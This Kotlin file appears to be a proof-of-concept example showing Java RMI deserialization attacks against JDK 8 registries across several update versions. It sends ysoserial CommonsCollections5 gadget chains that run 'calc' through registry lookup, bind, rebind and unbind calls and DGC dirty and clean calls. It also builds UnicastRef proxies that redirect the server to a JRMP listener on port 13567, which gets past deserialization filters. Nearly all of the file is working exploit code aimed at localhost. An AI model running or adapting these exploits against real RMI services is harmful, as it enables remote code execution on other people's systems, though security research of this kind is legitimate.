package example

import org.joor.Reflect
import sun.rmi.server.UnicastRef
import sun.rmi.transport.LiveRef
import sun.rmi.transport.tcp.TCPEndpoint
import top.ceclin.jrmp.DgcV1
import top.ceclin.jrmp.RegistryV1
import top.ceclin.jrmp.RegistryV2
import top.ceclin.jrmp.ext.replace
import top.ceclin.jrmp.request.Operation
import top.ceclin.jrmp.request.request
import top.ceclin.jrmp.request.singleOp
import java.lang.reflect.Proxy
import java.net.Socket
import java.rmi.Remote
import java.rmi.registry.Registry
import java.rmi.server.ObjID
import java.rmi.server.RMIServerSocketFactory
import java.rmi.server.RemoteObjectInvocationHandler
import java.rmi.server.UnicastRemoteObject
import javax.management.remote.rmi.RMIServer

fun main() {
    L8u242.p1()
}

private fun send(operation: Operation, host: String = "127.0.0.1", port: Int = Registry.REGISTRY_PORT) =
    Socket(host, port).use {
        it.tcpNoDelay = true
        it.outputStream.write(operation.singleOp().request().value)
        it.outputStream.flush()
        it.inputStream.readBytes()
    }

private fun evil(): Any = ysoserial.payloads.CommonsCollections5().getObject("calc")

private object L8u121 {
    fun p1() {
        val operation = RegistryV1.lookup { writeObject(evil()) }
        send(operation)
    }

    fun p2() {
        val operation = RegistryV1.bind { writeObject(evil()) }
        send(operation)
    }

    fun p3() {
        val operation = RegistryV1.unbind { writeObject(evil()) }
        send(operation)
    }

    fun p4() {
        val operation = RegistryV1.rebind { writeObject(evil()) }
        send(operation)
    }

    fun p5() {
        val operation = DgcV1.dirty { writeObject(evil()) }
        send(operation)
    }

    fun p6() {
        val operation = DgcV1.clean { writeObject(evil()) }
        send(operation)
    }
}

private object L8u212 {
    fun p1() {
        val operation = RegistryV2.rebind {
            writeObject("ccl")
            writeObject(remote())
        }
        send(operation)
    }

    private fun remote(): Remote {
        val host = "127.0.0.1"
        val port = 13567
        val ref = UnicastRef(LiveRef(ObjID(), TCPEndpoint(host, port), false))
        val proxy = Proxy.newProxyInstance(
            Thread.currentThread().contextClassLoader,
            arrayOf(Remote::class.java, RMIServer::class.java),
            RemoteObjectInvocationHandler(ref),
        )
        return proxy as Remote
    }
}

private object L8u232 {
    fun p1() {
        val host = "127.0.0.1"
        val port = 13567
        val ref = UnicastRef(LiveRef(ObjID(), TCPEndpoint(host, port), false))
        val operation = RegistryV1.lookup { writeObject(ref) }
        send(operation)
    }
}

private object L8u242 {
    fun p1() {
        val host = "127.0.0.1"
        val port = 13567
        val ref = UnicastRef(LiveRef(ObjID(), TCPEndpoint(host, port), false))
        val proxy = Proxy.newProxyInstance(
            RMIServerSocketFactory::class.java.classLoader,
            arrayOf(RMIServerSocketFactory::class.java, Remote::class.java),
            RemoteObjectInvocationHandler(ref),
        )
        val obj = Reflect.onClass(UnicastRemoteObject::class.java)
            .create()
            .set("ssf", proxy)
            .get<Any>()
        val operation = RegistryV1.lookup {
            replace = false
            writeObject(obj)
        }
        send(operation)
    }
}
